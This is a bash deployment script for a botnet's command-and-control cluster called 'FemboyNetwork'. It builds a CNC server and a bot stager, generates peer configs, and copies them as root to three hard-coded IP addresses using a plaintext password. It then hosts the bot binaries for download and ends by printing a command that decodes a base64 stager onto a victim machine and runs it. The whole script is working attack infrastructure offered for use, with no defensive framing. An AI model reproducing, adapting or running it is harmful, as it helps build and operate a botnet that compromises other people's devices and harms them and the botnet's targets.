#!/bin/bash

set -e

# =============================================
# FemboyNetwork CNC Cluster Setup Script
# Deploys CNC to 3 nodes, compiles bots, configures peers
# =============================================

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

# --- Cluster config ---
NODE1="198.157.13.51"
NODE2="198.157.13.52"
NODE3="198.157.13.55"
SSH_USER="root"
SSH_PASS="botnetvmc0redev012"
PEER_SECRET="botnetvmc0redev012"

CNC_LISTEN=":34129"
ADMIN_LISTEN=":34131"
BIN_LISTEN=":443"
PEER_LISTEN=":34133"
SCAN_LISTEN=":34130"
PROTO_KEY="fnbnet_proto_key_change_me"

BINS_DIR="/var/www/html/bins"
CNC_DIR="/opt/fmbnet"

echo "=== FemboyNetwork Cluster Setup ==="
echo "Nodes: $NODE1, $NODE2, $NODE3"
echo ""

# --- Step 1: Build everything locally ---
echo "[1/5] Building CNC + bots locally..."

cd "$PROJECT_DIR"

# Build CNC
go build -o /tmp/fmbnet_cnc ./cnc/...
echo "  CNC built"

# Compile bot stager (loader/stager.c)
if command -v gcc &>/dev/null; then
    gcc -static -O2 loader/stager.c -o /tmp/fmbnet_stager -lpthread 2>/dev/null || \
    gcc -O2 loader/stager.c -o /tmp/fmbnet_stager 2>/dev/null || \
    echo "  [!] stager compile failed (non-fatal)"
fi

# --- Step 2: Generate configs for each node ---
echo "[2/5] Generating node configs..."

generate_config() {
    local node_id=$1
    local node_ip=$2
    local peers=""
    
    # build peer list (all nodes except this one)
    if [ "$node_ip" != "$NODE1" ]; then peers="$peers\"$NODE1$PEER_LISTEN\","; fi
    if [ "$node_ip" != "$NODE2" ]; then peers="$peers\"$NODE2$PEER_LISTEN\","; fi
    if [ "$node_ip" != "$NODE3" ]; then peers="$peers\"$NODE3$PEER_LISTEN\","; fi
    peers="${peers%,}"
    
    cat > /tmp/fmbnet_config_${node_id}.json <<EOF
{
    "cnc_listen": "$node_ip$CNC_LISTEN",
    "admin_listen": "$node_ip$ADMIN_LISTEN",
    "scan_listen": "$node_ip$SCAN_LISTEN",
    "proto_key": "$PROTO_KEY",
    "http_server": "$node_ip",
    "tftp_server": "$node_ip",
    "bin_prefix": "fnbnet",
    "bin_path": "$BINS_DIR",
    "cnc_id": $node_id,
    "cnc_peers": [$peers],
    "peer_secret": "$PEER_SECRET",
    "peer_listen": "$node_ip$PEER_LISTEN"
}
EOF
    echo "  config for node $node_id ($node_ip) generated"
}

generate_config 1 "$NODE1"
generate_config 2 "$NODE2"
generate_config 3 "$NODE3"

# --- Step 3: Deploy to each node ---
echo "[3/5] Deploying to nodes..."

deploy_node() {
    local node_id=$1
    local node_ip=$2
    
    echo "  deploying to node $node_id ($node_ip)..."
    
    # Create directories
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${SSH_USER}@${node_ip} \
        "mkdir -p $CNC_DIR $BINS_DIR" 2>/dev/null
    
    # Upload CNC binary
    scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        /tmp/fmbnet_cnc ${SSH_USER}@${node_ip}:${CNC_DIR}/cnc
    
    # Upload config
    scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        /tmp/fmbnet_config_${node_id}.json ${SSH_USER}@${node_ip}:${CNC_DIR}/config.json
    
    # Upload stager if built
    if [ -f /tmp/fmbnet_stager ]; then
        scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            /tmp/fmbnet_stager ${SSH_USER}@${node_ip}:${BINS_DIR}/stager
    fi
    
    # Upload bot binaries (if they exist in release/)
    if [ -f "$PROJECT_DIR/release/fmbnet.x86" ]; then
        scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "$PROJECT_DIR/release/fmbnet"* ${SSH_USER}@${node_ip}:${BINS_DIR}/ 2>/dev/null || true
    fi
    
    # Stop old CNC, start new one
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${SSH_USER}@${node_ip} \
        "pkill -f 'cnc' 2>/dev/null; sleep 1; \
         cd $CNC_DIR && nohup ./cnc > /var/log/fmbnet.log 2>&1 & \
         echo '  node $node_id started (pid '\$!')'"
    
    echo "  node $node_id deployed"
}

deploy_node 1 "$NODE1"
deploy_node 2 "$NODE2"
deploy_node 3 "$NODE3"

# --- Step 4: Upload bot binaries to all nodes ---
echo "[4/5] Syncing bot binaries to all nodes..."

for node_ip in "$NODE1" "$NODE2" "$NODE3"; do
    if [ -d "$PROJECT_DIR/release" ]; then
        scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
            "$PROJECT_DIR"/release/fmbnet.* ${SSH_USER}@${node_ip}:${BINS_DIR}/ 2>/dev/null || true
        echo "  binaries synced to $node_ip"
    fi
done

# --- Step 5: Verify cluster ---
echo "[5/5] Verifying cluster..."

for node_ip in "$NODE1" "$NODE2" "$NODE3"; do
    if ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${SSH_USER}@${node_ip} \
        "pgrep -f 'cnc' >/dev/null 2>&1"; then
        echo "  $node_ip: CNC running"
    else
        echo "  $node_ip: CNC NOT running (check /var/log/fmbnet.log)"
    fi
done

echo ""
echo "=== Cluster setup complete ==="
echo ""
echo "SSH into any node:"
echo "  ssh ${SSH_USER}@${NODE1}"
echo "  ssh ${SSH_USER}@${NODE2}"
echo "  ssh ${SSH_USER}@${NODE3}"
echo ""
echo "Connect to admin panel:"
echo "  telnet ${NODE1} 34131"
echo "  telnet ${NODE2} 34131"
echo "  telnet ${NODE3} 34131"
echo ""
echo "Bots connect to: ${NODE2}:34129 (primary)"
echo "Failover: ${NODE3}:34129 -> ${NODE1}:34129"
echo ""
echo "Stager deployment on target:"
echo "  echo '<base64_of_stager>' | base64 -d > /tmp/s; chmod +x /tmp/s; /tmp/s"
